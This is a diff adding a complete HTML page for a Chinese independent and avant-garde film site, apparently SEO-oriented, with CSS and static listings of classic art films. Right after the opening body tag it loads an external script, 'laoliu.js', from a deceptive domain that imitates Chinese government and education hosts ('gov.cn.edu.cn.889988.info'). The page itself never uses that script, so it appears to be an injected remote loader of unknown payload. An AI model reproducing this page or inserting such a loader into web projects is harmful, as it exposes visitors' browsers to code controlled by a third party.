@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>先锋电影网 - 探索独立先锋电影世界</title>
+<meta name="description" content="先锋电影网（xianfengdianyingwang-h5）专注独立电影、先锋艺术影像、实验短片在线观看与推荐，网址 https://xianfengdianyingwang-h5.github.io">
+<meta name="keywords" content="先锋电影网, 独立电影, 先锋艺术影像, 实验短片">
+<style>
+/* ===== 全局样式 ===== */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: "PingFang SC", "Microsoft YaHei", -apple-system, sans-serif;
+    background: #07130c;
+    color: #d8ede0;
+    line-height: 1.7;
+    overflow-x: hidden;
+}
+
+a {
+    color: #4ade80;
+    text-decoration: none;
+    transition: color 0.3s;
+}
+
+a:hover {
+    color: #86efac;
+}
+
+/* ===== 顶部公告条 ===== */
+.announce {
+    background: linear-gradient(90deg, #14532d, #166534, #15803d);
+    color: #fff;
+    text-align: center;
+    padding: 9px 20px;
+    font-size: 13px;
+    letter-spacing: 1px;
+}
+
+/* ===== 导航 ===== */
+header {
+    background: rgba(7, 19, 12, 0.95);
+    backdrop-filter: blur(12px);
+    border-bottom: 1px solid rgba(74, 222, 128, 0.2);
+    position: sticky;
+    top: 0;
+    z-index: 999;
+}
+
+.nav-inner {
+    max-width: 1180px;
+    margin: auto;
+    padding: 14px 24px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.logo {
+    font-size: 24px;
+    font-weight: 800;
+    letter-spacing: 1px;
+    background: linear-gradient(90deg, #4ade80, #22d3ee);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+}
+
+nav {
+    display: flex;
+    gap: 28px;
+}
+
+nav a {
+    color: #cfe9d8;
+    font-size: 15px;
+    position: relative;
+}
+
+nav a::after {
+    content: "";
+    position: absolute;
+    left: 0;
+    bottom: -6px;
+    width: 0;
+    height: 2px;
+    background: #4ade80;
+    transition: width 0.3s;
+}
+
+nav a:hover::after {
+    width: 100%;
+}
+
+.menu-toggle {
+    display: none;
+    flex-direction: column;
+    gap: 5px;
+    cursor: pointer;
+}
+
+.menu-toggle span {
+    width: 24px;
+    height: 2px;
+    background: #4ade80;
+    border-radius: 2px;
+}
+
+/* ===== Hero ===== */
+.hero {
+    position: relative;
+    min-height: 80vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    padding: 60px 24px;
+    background:
+        radial-gradient(circle at 20% 30%, rgba(74, 222, 128, 0.18), transparent 45%),
+        radial-gradient(circle at 80% 70%, rgba(34, 211, 238, 0.15), transparent 45%),
+        linear-gradient(135deg, #07130c 0%, #0a2418 100%);
+}
+
+.hero-content {
+    max-width: 820px;
+    position: relative;
+    z-index: 2;
+}
+
+.hero h1 {
+    font-size: 52px;
+    font-weight: 900;
+    line-height: 1.2;
+    margin-bottom: 20px;
+    background: linear-gradient(90deg, #4ade80, #22d3ee, #4ade80);
+    background-size: 200% 100%;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    animation: shimmer 4s ease infinite;
+}
+
+@keyframes shimmer {
+    0%, 100% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+}
+
+.hero p {
+    font-size: 17px;
+    color: #a7d3b4;
+    margin-bottom: 14px;
+}
+
+.hero-url {
+    display: inline-block;
+    margin-top: 8px;
+    padding: 6px 18px;
+    border: 1px solid rgba(74, 222, 128, 0.4);
+    border-radius: 20px;
+    color: #86efac;
+    font-size: 14px;
+}
+
+/* 浮动装饰圈 */
+.hero::before,
+.hero::after {
+    content: "";
+    position: absolute;
+    border-radius: 50%;
+    border: 1px solid rgba(74, 222, 128, 0.15);
+}
+
+.hero::before {
+    width: 320px;
+    height: 320px;
+    top: 10%;
+    left: -80px;
+}
+
+.hero::after {
+    width: 460px;
+    height: 460px;
+    bottom: -120px;
+    right: -140px;
+}
+
+/* ===== 通用栏目 ===== */
+section {
+    max-width: 1180px;
+    margin: 70px auto;
+    padding: 0 24px;
+}
+
+.section-head {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-bottom: 34px;
+}
+
+.section-head .badge {
+    width: 42px;
+    height: 42px;
+    border-radius: 12px;
+    background: linear-gradient(135deg, #4ade80, #22d3ee);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 20px;
+    font-weight: 900;
+    color: #07130c;
+    flex-shrink: 0;
+}
+
+.section-head h2 {
+    font-size: 26px;
+    color: #e8f7ee;
+    font-weight: 800;
+}
+
+/* ===== 栏目一：精选推荐（交错阶梯布局） ===== */
+.spotlight {
+    display: flex;
+    flex-direction: column;
+    gap: 26px;
+}
+
+.spot-card {
+    display: grid;
+    grid-template-columns: 1.3fr 1fr;
+    gap: 0;
+    background: #0c2015;
+    border-radius: 16px;
+    overflow: hidden;
+    border: 1px solid rgba(74, 222, 128, 0.12);
+}
+
+.spot-card:nth-child(even) {
+    grid-template-columns: 1fr 1.3fr;
+}
+
+.spot-card:nth-child(even) .spot-img {
+    order: 2;
+}
+
+.spot-img {
+    min-height: 240px;
+    background-size: cover;
+    background-position: center;
+}
+
+.spot-info {
+    padding: 34px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+.spot-info .tag {
+    align-self: flex-start;
+    padding: 4px 12px;
+    background: rgba(74, 222, 128, 0.15);
+    color: #4ade80;
+    border-radius: 6px;
+    font-size: 12px;
+    margin-bottom: 14px;
+}
+
+.spot-info h3 {
+    font-size: 22px;
+    color: #e8f7ee;
+    margin-bottom: 12px;
+}
+
+.spot-info p {
+    color: #93c5a8;
+    font-size: 14px;
+}
+
+/* ===== 栏目二：影片分类（蜂窝图标网格） ===== */
+.cats {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 20px;
+}
+
+.cat-card {
+    background: #0c2015;
+    border-radius: 14px;
+    padding: 26px 20px;
+    text-align: center;
+    border: 1px solid rgba(74, 222, 128, 0.1);
+    transition: transform 0.3s, border-color 0.3s;
+}
+
+.cat-card:hover {
+    transform: translateY(-6px);
+    border-color: rgba(74, 222, 128, 0.5);
+}
+
+.cat-icon {
+    width: 58px;
+    height: 58px;
+    margin: 0 auto 14px;
+    border-radius: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 26px;
+}
+
+.cat-card:nth-child(1) .cat-icon { background: linear-gradient(135deg, #4ade80, #22c55e); }
+.cat-card:nth-child(2) .cat-icon { background: linear-gradient(135deg, #22d3ee, #0ea5e9); }
+.cat-card:nth-child(3) .cat-icon { background: linear-gradient(135deg, #fbbf24, #f59e0b); }
+.cat-card:nth-child(4) .cat-icon { background: linear-gradient(135deg, #f472b6, #ec4899); }
+
+.cat-card h4 {
+    color: #e8f7ee;
+    font-size: 16px;
+    margin-bottom: 6px;
+}
+
+.cat-card span {
+    color: #6d9f7d;
+    font-size: 13px;
+}
+
+/* ===== 栏目三：热播排行（左侧榜单 + 右侧动态） ===== */
+.rank-wrap {
+    display: grid;
+    grid-template-columns: 1.4fr 1fr;
+    gap: 26px;
+}
+
+.rank-list {
+    background: #0c2015;
+    border-radius: 16px;
+    padding: 10px 24px;
+    border: 1px solid rgba(74, 222, 128, 0.12);
+    counter-reset: rank;
+    list-style: none;
+}
+
+.rank-list li {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    padding: 16px 0;
+    border-bottom: 1px solid rgba(74, 222, 128, 0.08);
+    counter-increment: rank;
+}
+
+.rank-list li:last-child {
+    border-bottom: none;
+}
+
+.rank-list li::before {
+    content: counter(rank);
+    width: 30px;
+    height: 30px;
+    border-radius: 8px;
+    background: rgba(74, 222, 128, 0.12);
+    color: #4ade80;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 800;
+    font-size: 14px;
+    flex-shrink: 0;
+}
+
+.rank-list li:nth-child(-n+3)::before {
+    background: linear-gradient(135deg, #4ade80, #22d3ee);
+    color: #07130c;
+}
+
+.rank-list .rank-title {
+    flex: 1;
+    color: #d8ede0;
+    font-size: 15px;
+}
+
+.rank-list .rank-meta {
+    color: #6d9f7d;
+    font-size: 13px;
+}
+
+/* 右侧动态栏 */
+.trends {
+    background: #0c2015;
+    border-radius: 16px;
+    padding: 24px;
+    border: 1px solid rgba(74, 222, 128, 0.12);
+}
+
+.trends h4 {
+    color: #e8f7ee;
+    font-size: 16px;
+    margin-bottom: 18px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+}
+
+.trend-item {
+    display: flex;
+    gap: 14px;
+    padding: 12px 0;
+    border-bottom: 1px dashed rgba(74, 222, 128, 0.08);
+}
+
+.trend-item:last-child {
+    border-bottom: none;
+}
+
+.trend-date {
+    flex-shrink: 0;
+    width: 46px;
+    text-align: center;
+}
+
+.trend-date b {
+    display: block;
+    color: #4ade80;
+    font-size: 18px;
+    line-height: 1;
+}
+
+.trend-date small {
+    color: #6d9f7d;
+    font-size: 11px;
+}
+
+.trend-text {
+    color: #93c5a8;
+    font-size: 14px;
+}
+
+/* ===== 栏目四：最新更新（时间轴） ===== */
+.timeline {
+    position: relative;
+    padding-left: 34px;
+}
+
+.timeline::before {
+    content: "";
+    position: absolute;
+    left: 8px;
+    top: 6px;
+    bottom: 6px;
+    width: 2px;
+    background: linear-gradient(to bottom, #4ade80, rgba(74, 222, 128, 0.05));
+}
+
+.tl-item {
+    position: relative;
+    margin-bottom: 26px;
+}
+
+.tl-item::before {
+    content: "";
+    position: absolute;
+    left: -31px;
+    top: 6px;
+    width: 12px;
+    height: 12px;
+    border-radius: 50%;
+    background: #4ade80;
+    box-shadow: 0 0 0 4px rgba(74, 222, 128, 0.15);
+}
+
+.tl-card {
+    background: #0c2015;
+    border-radius: 12px;
+    padding: 18px 22px;
+    border: 1px solid rgba(74, 222, 128, 0.1);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    gap: 20px;
+}
+
+.tl-card .tl-info h4 {
+    color: #e8f7ee;
+    font-size: 16px;
+    margin-bottom: 4px;
+}
+
+.tl-card .tl-info p {
+    color: #6d9f7d;
+    font-size: 13px;
+}
+
+.tl-card .tl-time {
+    color: #4ade80;
+    font-size: 13px;
+    white-space: nowrap;
+    flex-shrink: 0;
+}
+
+/* ===== 栏目五：关于我们（左文右卡） ===== */
+.about-wrap {
+    display: grid;
+    grid-template-columns: 1.3fr 1fr;
+    gap: 30px;
+}
+
+.about-text {
+    background: #0c2015;
+    border-radius: 16px;
+    padding: 34px;
+    border: 1px solid rgba(74, 222, 128, 0.12);
+}
+
+.about-text p {
+    color: #93c5a8;
+    margin-bottom: 14px;
+    font-size: 15px;
+}
+
+.about-feats {
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+}
+
+.feat-card {
+    background: #0c2015;
+    border-radius: 14px;
+    padding: 22px;
+    border: 1px solid rgba(74, 222, 128, 0.12);
+}
+
+.feat-card h5 {
+    color: #4ade80;
+    font-size: 15px;
+    margin-bottom: 6px;
+}
+
+.feat-card p {
+    color: #93c5a8;
+    font-size: 13px;
+}
+
+/* ===== 页脚 ===== */
+footer {
+    background: #050d08;
+    border-top: 1px solid rgba(74, 222, 128, 0.12);
+    margin-top: 80px;
+    padding: 50px 24px 30px;
+}
+
+.foot-inner {
+    max-width: 1180px;
+    margin: auto;
+    display: grid;
+    grid-template-columns: 2fr 1fr 1fr 1fr;
+    gap: 40px;
+}
+
+.foot-brand .logo {
+    font-size: 22px;
+    margin-bottom: 14px;
+    display: inline-block;
+}
+
+.foot-brand p {
+    color: #6d9f7d;
+    font-size: 13px;
+}
+
+.foot-col h5 {
+    color: #e8f7ee;
+    font-size: 15px;
+    margin-bottom: 14px;
+}
+
+.foot-col a {
+    display: block;
+    color: #6d9f7d;
+    font-size: 14px;
+    margin-bottom: 8px;
+}
+
+.foot-col a:hover {
+    color: #4ade80;
+}
+
+.copyright {
+    max-width: 1180px;
+    margin: 34px auto 0;
+    padding-top: 24px;
+    border-top: 1px solid rgba(74, 222, 128, 0.1);
+    text-align: center;
+    color: #52755e;
+    font-size: 12px;
+}
+
+/* ===== 移动端自适应 ===== */
+@media (max-width: 900px) {
+    .cats { grid-template-columns: repeat(2, 1fr); }
+    .rank-wrap { grid-template-columns: 1fr; }
+    .foot-inner { grid-template-columns: 1fr 1fr; }
+}
+
+@media (max-width: 768px) {
+    .hero h1 { font-size: 34px; }
+    .menu-toggle { display: flex; }
+    nav {
+        display: none;
+        position: absolute;
+        top: 100%;
+        left: 0;
+        right: 0;
+        flex-direction: column;
+        background: #07130c;
+        padding: 20px;
+        border-bottom: 1px solid rgba(74, 222, 128, 0.15);
+    }
+    nav.open { display: flex; }
+    nav a { padding: 8px 0; }
+    .spot-card,
+    .spot-card:nth-child(even) {
+        grid-template-columns: 1fr;
+    }
+    .spot-card:nth-child(even) .spot-img { order: 0; }
+    .spot-img { min-height: 200px; }
+    .about-wrap { grid-template-columns: 1fr; }
+}
+
+@media (max-width: 480px) {
+    .cats { grid-template-columns: 1fr 1fr; }
+    .foot-inner { grid-template-columns: 1fr; }
+    .hero h1 { font-size: 28px; }
+    .section-head h2 { font-size: 21px; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="announce">🎬 先锋电影网 · 独立影像 · 每日精选更新 · 网址：https://xianfengdianyingwang-h5.github.io</div>
+
+<header>
+    <div class="nav-inner">
+        <div class="logo">先锋电影网</div>
+        <nav id="nav">
+            <a href="#">首页</a>
+            <a href="#featured">精选推荐</a>
+            <a href="#cats">影片分类</a>
+            <a href="#rank">热播排行</a>
+            <a href="#update">最新更新</a>
+            <a href="#about">关于我们</a>
+        </nav>
+        <div class="menu-toggle" id="toggle">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </div>
+</header>
+
+<!-- 首页 Hero -->
+<section class="hero">
+    <div class="hero-content">
+        <h1>探索独立影像<br>先锋电影新视界</h1>
+        <p>先锋电影网（xianfengdianyingwang-h5）专注独立电影、艺术影像与实验短片在线观看与推荐</p>
+        <p>网址：https://xianfengdianyingwang-h5.github.io</p>
+        <span class="hero-url">🌿 每天发现一部好片</span>
+    </div>
+</section>
+
+<!-- 栏目一：精选推荐（交错阶梯） -->
+<section id="featured">
+    <div class="section-head">
+        <div class="badge">精</div>
+        <h2>精选推荐</h2>
+    </div>
+    <div class="spotlight">
+        <div class="spot-card">
+            <div class="spot-img" style="background-image:url('https://picsum.photos/800/500?random=11')"></div>
+            <div class="spot-info">
+                <span class="tag">编辑推荐</span>
+                <h3>《广岛之恋》</h3>
+                <p>先锋电影网高分推荐 · 法国新浪潮代表作，意识流叙事的开山之作，探索记忆与遗忘的边界。</p>
+            </div>
+        </div>
+        <div class="spot-card">
+            <div class="spot-img" style="background-image:url('https://picsum.photos/800/500?random=12')"></div>
+            <div class="spot-info">
+                <span class="tag">艺术影像</span>
+                <h3>《去年在马里昂巴德》</h3>
+                <p>先锋电影网经典回顾 · 时间、空间与记忆交织的影像实验，重新定义电影叙事语言。</p>
+            </div>
+        </div>
+        <div class="spot-card">
+            <div class="spot-img" style="background-image:url('https://picsum.photos/800/500?random=13')"></div>
+            <div class="spot-info">
+                <span class="tag">实验短片</span>
+                <h3>《一条安达鲁狗》</h3>
+                <p>先锋电影网必看榜单 · 超现实主义电影里程碑，打破传统逻辑的视觉冲击。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目二：影片分类（蜂窝图标网格） -->
+<section id="cats">
+    <div class="section-head">
+        <div class="badge">类</div>
+        <h2>影片分类</h2>
+    </div>
+    <div class="cats">
+        <div class="cat-card">
+            <div class="cat-icon">🎞️</div>
+            <h4>独立电影</h4>
+            <span>1,200+ 部</span>
+        </div>
+        <div class="cat-card">
+            <div class="cat-icon">🎭</div>
+            <h4>艺术影像</h4>
+            <span>860+ 部</span>
+        </div>
+        <div class="cat-card">
+            <div class="cat-icon">🧪</div>
+            <h4>实验短片</h4>
+            <span>530+ 部</span>
+        </div>
+        <div class="cat-card">
+            <div class="cat-icon">🌍</div>
+            <h4>纪录片</h4>
+            <span>640+ 部</span>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目三：热播排行 -->
+<section id="rank">
+    <div class="section-head">
+        <div class="badge">榜</div>
+        <h2>热播排行</h2>
+    </div>
+    <div class="rank-wrap">
+        <ul class="rank-list">
+            <li><span class="rank-title">《假面》</span><span class="rank-meta">伯格曼经典</span></li>
+            <li><span class="rank-title">《驴子巴特萨》</span><span class="rank-meta">布列松名作</span></li>
+            <li><span class="rank-title">《狂人皮埃罗》</span><span class="rank-meta">戈达尔代表作</span></li>
+            <li><span class="rank-title">《蚀》</span><span class="rank-meta">安东尼奥尼</span></li>
+            <li><span class="rank-title">《红色沙漠》</span><span class="rank-meta">色彩实验先驱</span></li>
+        </ul>
+        <div class="trends">
+            <h4>📌 先锋资讯</h4>
+            <div class="trend-item">
+                <div class="trend-date"><b>12</b><small>10月</small></div>
+                <div class="trend-text">先锋电影网新增法国新浪潮专题片单</div>
+            </div>
+            <div class="trend-item">
+                <div class="trend-date"><b>08</b><small>10月</small></div>
+                <div class="trend-text">实验短片展映专区正式上线</div>
+            </div>
+            <div class="trend-item">
+                <div class="trend-date"><b>01</b><small>10月</small></div>
+                <div class="trend-text">独立电影导演访谈专栏开更</div>
+            </div>
+            <div class="trend-item">
+                <div class="trend-date"><b>25</b><small>09月</small></div>
+                <div class="trend-text">纪录片板块扩充至 640+ 部</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目四：最新更新（时间轴） -->
+<section id="update">
+    <div class="section-head">
+        <div class="badge">新</div>
+        <h2>最新更新</h2>
+    </div>
+    <div class="timeline">
+        <div class="tl-item">
+            <div class="tl-card">
+                <div class="tl-info">
+                    <h4>《筋疲力尽》</h4>
+                    <p>戈达尔 · 法国新浪潮开山之作</p>
+                </div>
+                <span class="tl-time">2 小时前</span>
+            </div>
+        </div>
+        <div class="tl-item">
+            <div class="tl-card">
+                <div class="tl-info">
+                    <h4>《白日美人》</h4>
+                    <p>布努埃尔 · 超现实主义名作</p>
+                </div>
+                <span class="tl-time">5 小时前</span>
+            </div>
+        </div>
+        <div class="tl-item">
+            <div class="tl-card">
+                <div class="tl-info">
+                    <h4>《柏林苍穹下》</h4>
+                    <p>文德斯 · 天使视角的人间观察</p>
+                </div>
+                <span class="tl-time">昨天</span>
+            </div>
+        </div>
+        <div class="tl-item">
+            <div class="tl-card">
+                <div class="tl-info">
+                    <h4>《四百击》</h4>
+                    <p>特吕弗 · 新浪潮里程碑</p>
+                </div>
+                <span class="tl-time">2 天前</span>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目五：关于我们 -->
+<section id="about">
+    <div class="section-head">
+        <div class="badge">关</div>
+        <h2>关于我们</h2>
+    </div>
+    <div class="about-wrap">
+        <div class="about-text">
+            <p><strong style="color:#4ade80">先锋电影网</strong>（xianfengdianyingwang-h5）致力于为影迷呈现独立、前卫、具有探索精神的电影作品。</p>
+            <p>从法国新浪潮到当代实验影像，从艺术纪录片到先锋短片，我们精选每一个值得被看见的影像瞬间。</p>
+            <p>网站地址：https://xianfengdianyingwang-h5.github.io</p>
+        </div>
+        <div class="about-feats">
+            <div class="feat-card">
+                <h5>🌱 独立精神</h5>
+                <p>专注独立制作，挖掘非主流佳作</p>
+            </div>
+            <div class="feat-card">
+                <h5>🎨 艺术品质</h5>
+                <p>高清修复，还原导演创作本意</p>
+            </div>
+            <div class="feat-card">
+                <h5>🔄 每日更新</h5>
+                <p>持续扩充片库，新鲜内容不断</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="foot-inner">
+        <div class="foot-brand">
+            <div class="logo">先锋电影网</div>
+            <p>探索独立影像，发现电影更多可能。专注先锋、艺术与实验电影在线观看与推荐。</p>
+        </div>
+        <div class="foot-col">
+            <h5>网站导航</h5>
+            <a href="#">首页</a>
+            <a href="#">精选推荐</a>
+            <a href="#">影片分类</a>
+        </div>
+        <div class="foot-col">
+            <h5>热门栏目</h5>
+            <a href="#">热播排行</a>
+            <a href="#">最新更新</a>
+            <a href="#">关于我们</a>
+        </div>
+        <div class="foot-col">
+            <h5>关于本站</h5>
+            <a href="#">网站介绍</a>
+            <a href="#">联系方式</a>
+            <a href="#">免责声明</a>
+        </div>
+    </div>
+    <div class="copyright">
+        © 2026 先锋电影网 | 网站名称：先锋电影网 | 网址：https://xianfengdianyingwang-h5.github.io
+    </div>
+</footer>
+
+<script>
+document.getElementById('toggle').addEventListener('click', function() {
+    document.getElementById('nav').classList.toggle('open');
+});
+</script>
+
+</body>
+</html>
